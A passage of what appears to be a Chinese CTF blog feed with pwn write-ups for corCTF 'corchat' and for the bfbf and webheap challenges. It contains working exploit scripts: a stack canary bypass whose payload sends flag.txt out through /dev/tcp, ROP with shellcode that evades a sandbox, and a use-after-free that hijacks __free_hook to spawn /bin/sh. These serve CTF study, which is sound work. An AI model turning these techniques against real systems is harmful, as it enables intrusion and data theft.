class="hljs-type">uint16_t</span> flags;<br>    <span class="hljs-type">uint16_t</span> len;<br>&#125; cor_msg_buf;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">32</span>];<br>    <span class="hljs-type">uint16_t</span> len;<br>&#125; cor_uname_buf;<br><span class="hljs-type">void</span> <span class="hljs-title function_">DoAdmin</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *cmd, <span class="hljs-type">int8_t</span> fd)</span><br>&#123;<br>    FILE *p;<br>    <span class="hljs-type">char</span> c;<br><br>    p = popen(cmd, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (p == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Something went wrong spawning the process!&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (feof(p) == <span class="hljs-literal">false</span>)<br>    &#123;<br>        fread(&amp;c, <span class="hljs-keyword">sizeof</span>(c), <span class="hljs-number">1</span>, p);<br>        <span class="hljs-keyword">if</span> (send(fd, &amp;c, <span class="hljs-keyword">sizeof</span>(c), <span class="hljs-number">0</span>) &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    pclose(p);<br>&#125;<br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> <span class="hljs-title function_">Crusader::RecvMessage</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> msg = <span class="hljs-string">&quot;&quot;</span>;<br>    cor_msg_buf msg_buf;<br><br>    <span class="hljs-built_in">memset</span>(msg_buf.buffer, <span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-keyword">sizeof</span>(msg_buf.buffer));<br><br>    <span class="hljs-keyword">if</span> (read(this-&gt;m_sock_fd, &amp;msg_buf.len, <span class="hljs-keyword">sizeof</span>(msg_buf.len)) &lt;= <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> msg;<br><br>    <span class="hljs-keyword">if</span> (msg_buf.len &gt;= <span class="hljs-keyword">sizeof</span>(msg_buf.buffer) || msg_buf.len == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> msg;<br><br>    <span class="hljs-keyword">if</span> (read(this-&gt;m_sock_fd, &amp;msg_buf.flags, <span class="hljs-keyword">sizeof</span>(msg_buf.flags)) &lt;= <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> msg;<br><br>    msg_buf.len -= <span class="hljs-keyword">sizeof</span>(msg_buf.flags); <br>    <span class="hljs-keyword">if</span> (msg_buf.len &lt;= <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> msg;<br>    <span class="hljs-comment">/* 当msg_buf.len 等于1 时 1-2==-1 </span><br><span class="hljs-comment">        因为msg_buf.len 为uint16_t 类型，所以实际上msg_buf.len会变成65535 */</span><br>    <span class="hljs-keyword">if</span> (read(this-&gt;m_sock_fd, msg_buf.buffer, msg_buf.len) &lt;= <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> msg;<br><br>    msg_buf.buffer[msg_buf.len] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br>    <span class="hljs-comment">/* 因为程序开启了stack canary，所以需要绕过验证</span><br><span class="hljs-comment">        在程序中存放当前线程的canary的地址就在 &amp;msg_buf+0xd78 的位置</span><br><span class="hljs-comment">        所以可以先通过多次溢出设置当前线程的canary为 0</span><br><span class="hljs-comment">        主要就是通过溢出msg_buf.buffer 修改msg_buf.len的值，来达到0~0xffff范围内任意地址写0*/</span><br>    msg += msg_buf.buffer;<br><br>    <span class="hljs-keyword">return</span> msg;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/corctf/corctf-pwn-corchat.jpg" srcset="/img/loading.gif" lazyload alt=""><br>通过逆向不难看出这里的<code>a1</code>，指向了代码中的<code>msg</code>，所以如果现在控制程序流调用某个函数，那么那个函数的第一个参数就是<code>&amp;msg</code>，就是我们输入的<code>msg_buf.buffer</code>的内容,在程序中存在函数<code>popen</code>可以指向系统命令,如何可以控制程序流执行<code>popen</code>函数就可以直接在靶机中执行我们像执行的系统命令了，但程序中没有可以用来获取程序地址的漏洞，所以无法通过直接调用<code>popen</code>的方式执行命令,不过可以通过一个能够执行一指令从而调用<code>popen</code>的程序地址，但在当前线程的栈中必须存在与其相近的地址，而<code>Crusader::RecvMessage</code>函数会返回到<code>ChatServer::RecvCrusaderMessages</code>函数中，所以只要控制了返回地址的低两个字节，就可以使程序执行<code>ChatServer::RecvCrusaderMessages</code>函数中的<code>DoAdmin(msg,???);</code>指令,进而利用<code>popen</code>函数执行我们想要执行的系统命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setuname</span>(<span class="hljs-params">data</span>):<br>    p.send(<span class="hljs-string">&#x27;SET_UNAME&#x27;</span>)<br>    p.send(p16(<span class="hljs-number">0x1f</span>)+data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getstatus</span>():<br>    p.send(<span class="hljs-string">&#x27;GETSTATUS&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sendmsg</span>(<span class="hljs-params">data,flags=<span class="hljs-number">0</span></span>):<br>    p.send(<span class="hljs-string">&#x27;_SEND_MSG&#x27;</span>)<br>    p.send(p16(<span class="hljs-number">1</span>))<br>    p.send(p16(flags))<br>    p.send(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getuname</span>():<br>    p.send(<span class="hljs-string">&#x27;GET_UNAME&#x27;</span>)<br><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;8080&#x27;</span>)<br>cookie=<span class="hljs-number">0xd78</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    <span class="hljs-built_in">print</span>(i)<br>    sendmsg(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x400</span>+p16(<span class="hljs-number">0</span>)+p16(cookie+i)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+<span class="hljs-string">&#x27;\x00&#x27;</span>*(i+<span class="hljs-number">1</span>))<br>    pause()<br><span class="hljs-comment"># set canary=0</span><br><br>payload=<span class="hljs-string">&#x27;/bin/bash -c &quot;cat flag.txt &gt; /dev/tcp/127.0.0.1/8888&quot; &#x27;</span><br>payload=payload.ljust(<span class="hljs-number">0x400</span>,<span class="hljs-string">&#x27;a&#x27;</span>)+p16(<span class="hljs-built_in">len</span>(payload))*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&#x27;\x11&#x27;</span><br>sendmsg(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第五届强网拟态挑战赛预赛-pwn</title>
    <link href="/page/wp/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn/"/>
    <url>/page/wp/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn/</url>
    
    <content type="html"><![CDATA[<h2 id="bfbf">bfbf</h2><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-bfbf.jpg" srcset="/img/loading.gif" lazyload alt="bfbf_parse函数代码" title="bfbf_parse函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-bfbf-1.jpg" srcset="/img/loading.gif" lazyload alt="run_bfbf函数代码" title="run_bfbf函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-bfbf-2.jpg" srcset="/img/loading.gif" lazyload alt="读取brainfuck代码处代码" title="读取brainfuck代码处代码"></p><p>通过run_bfbf函数中看到，brain fuck的指针指向的地址位于栈中，且没有限制偏移大小，所以可以利用 <code>&lt;</code>,<code>&gt;</code>或<code>[]</code>将指针偏移到指定位置泄露<code>run_bfbf的返回地址</code>，<code>__libc_start_main函数地址</code>,并且可以控制返回地址，构造<code>rop</code></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-bfbf-3.jpg" srcset="/img/loading.gif" lazyload alt=""></p><p>程序中开启了沙盒,当程序执行过程中从非<code>0</code>或<code>1</code>句柄中读取数据,就退出程序,这让我们不能通过执行<code>/bin/sh</code>获取设立了,且不能直接使用<code>orw</code>读取flag文件,不过可以通过<code>dup2</code>将<code>open(&quot;flag&quot;)</code>开启的3句柄，转移到<code>0</code>句柄上,这样就可以获取flag了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>rdi=<span class="hljs-number">0x0000000000023b72</span><br>rsi=<span class="hljs-number">0x000000000002604f</span><br>rdx=<span class="hljs-number">0x0000000000119241</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">mode=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-keyword">global</span> p,e,libc<br>    <span class="hljs-keyword">if</span> (mode):<br>        p=process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p=remote(<span class="hljs-string">&#x27;127.0.0.1:4444&#x27;</span>)<br>    e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>    libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>,checksec=<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">att</span>(<span class="hljs-params">cmd=<span class="hljs-string">&quot;&quot;</span></span>):<br>    gdb.attach(p,cmd)<br>    pause()<br><br>libc=<span class="hljs-string">&quot;&quot;</span><br>e=<span class="hljs-string">&quot;&quot;</span><br>p=<span class="hljs-string">&quot;&quot;</span><br>check()<br>context.binary=e<br>payload=<span class="hljs-string">b&#x27;&gt;&#x27;</span>*<span class="hljs-number">536</span>+<span class="hljs-string">b&#x27;.&gt;&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">b&#x27;&gt;&#x27;</span>*<span class="hljs-number">16</span>+<span class="hljs-string">b&#x27;&gt;&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">b&#x27;.&gt;&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">b&#x27;&lt;&#x27;</span>*<span class="hljs-number">40</span>+<span class="hljs-string">&#x27;,&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;\n&quot;</span>,payload)<br>e.address=u64(p.read(<span class="hljs-number">8</span>))-<span class="hljs-number">0x1955</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(e.address))<br>d=u64(p.read(<span class="hljs-number">8</span>))-libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>libc.address=d&amp;<span class="hljs-number">0xfffffffffffff000</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>p.send(<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    控制返回地址到读取用户输入的位置</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>rdi=libc.address+rdi<br>rsi=libc.address+rsi<br>rdx=libc.address+rdx<br>read=libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>bss=e.bss(<span class="hljs-number">0x100</span>)<br><br>r=flat([rdi,<span class="hljs-number">0</span>,rsi,bss,rdx,<span class="hljs-number">0x200</span>,<span class="hljs-number">1</span>,read,rdi,bss&amp;<span class="hljs-number">0xfffffffffffff000</span>,rsi,<span class="hljs-number">0x1000</span>,rdx,<span class="hljs-number">0x7</span>,<span class="hljs-number">1</span>,mprotect,bss])<br>payload=<span class="hljs-string">b&#x27;&gt;&#x27;</span>*<span class="hljs-number">536</span>+<span class="hljs-string">&#x27;,&gt;&#x27;</span>*<span class="hljs-built_in">len</span>(r)<br>p.sendline(payload)<br>p.send(r)<br><br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag&quot;</span>)+shellcraft.dup2(<span class="hljs-number">3</span>,<span class="hljs-number">0</span>)+shellcraft.read(<span class="hljs-number">0</span>,bss+<span class="hljs-number">0x200</span>,<span class="hljs-number">0x40</span>)+shellcraft.write(<span class="hljs-number">1</span>,bss+<span class="hljs-number">0x200</span>,<span class="hljs-number">0x40</span>)<br>p.sendline(asm(shellcode))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="webheap">webheap</h2><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-webheap.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-webheap-1.jpg" srcset="/img/loading.gif" lazyload alt="run_packet函数代码" title="run_packet函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-webheap-2.jpg" srcset="/img/loading.gif" lazyload alt="create函数代码" title="create函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-webheap-3.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-webheap-4.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-webheap-5.jpg" srcset="/img/loading.gif" lazyload alt="edit函数代码" title="edit函数代码"></p><p>主要难点在于分析<code>parse_packet</code>函数比较麻烦，通过<code>delete</code>函数可以发现，程序存在<code>uaf</code>漏洞，那么剩下的就简单了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_head</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;\xb9\x05&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_mode</span>(<span class="hljs-params">mode</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;\x84&quot;</span>+p8(mode)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_index</span>(<span class="hljs-params">ind</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;\x80&quot;</span>+p8(ind)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_size</span>(<span class="hljs-params">size=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;\x81&quot;</span>+p16(size)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_data</span>(<span class="hljs-params">data=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;\xbd\x81&quot;</span>+p16(<span class="hljs-built_in">len</span>(data))+data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_end</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x80\x00&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">payload</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;length: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    payload=make_head()+\<br>            make_mode(<span class="hljs-number">0</span>)+\<br>            make_index(ind)+\<br>            make_size(size)+\<br>            make_data()+\<br>            make_end()<br>    send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    payload=make_head()+\<br>            make_mode(<span class="hljs-number">1</span>)+\<br>            make_index(ind)+\<br>            make_size()+\<br>            make_data()+\<br>            make_end()<br>    send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    payload=make_head()+\<br>            make_mode(<span class="hljs-number">2</span>)+\<br>            make_index(ind)+\<br>            make_size()+\<br>            make_data()+\<br>            make_end()<br>    send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    payload=make_head()+\<br>            make_mode(<span class="hljs-number">3</span>)+\<br>            make_index(ind)+\<br>            make_size()+\<br>            make_data(data)+\<br>            make_end()<br>    send(payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">att</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    gdb.attach(p,cmd)<br>    pause()<br><br>p=process(<span class="hljs-string">&#x27;./webheap&#x27;</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x430</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x30</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>malloc_hook=d-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>edit(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">1</span>,p64(free_hook))<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x30</span>)<br>edit(<span class="hljs-number">5</span>,p64(system))<br>free(<span class="hljs-number">3</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="webheap-revenge">webheap_revenge</h2><p>程序主要逻辑与<code>webheap</code>相同，所以交互的脚本不需要重新写，直接拿<code>webheap</code>的就好了</p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-webheap_regenve.jpg" srcset="/img/loading.gif" lazyload alt="构造chunk代码" title="构造chunk代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-webheap_regenve-1.jpg" srcset="/img/loading.gif" lazyload alt="查看chunk代码" title="查看chunk代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-webheap_regenve-2.jpg" srcset="/img/loading.gif" lazyload alt="释放chunk代码" title="释放chunk代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-webheap_regenve-3.jpg" srcset="/img/loading.gif" lazyload alt="编辑chunk代码" 